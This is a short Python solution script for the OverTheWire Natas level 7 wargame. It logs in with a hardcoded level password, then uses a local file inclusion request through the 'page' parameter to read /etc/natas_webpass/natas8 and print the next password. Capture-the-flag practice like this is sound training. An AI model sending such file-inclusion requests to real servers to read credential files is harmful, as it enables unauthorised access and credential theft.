#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.session()
response = session.get(url + "index.php?page=/etc/natas_webpass/natas8", auth = (username, password))
content = response.text

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('<br>\n<br>\n(.*)', content)[0])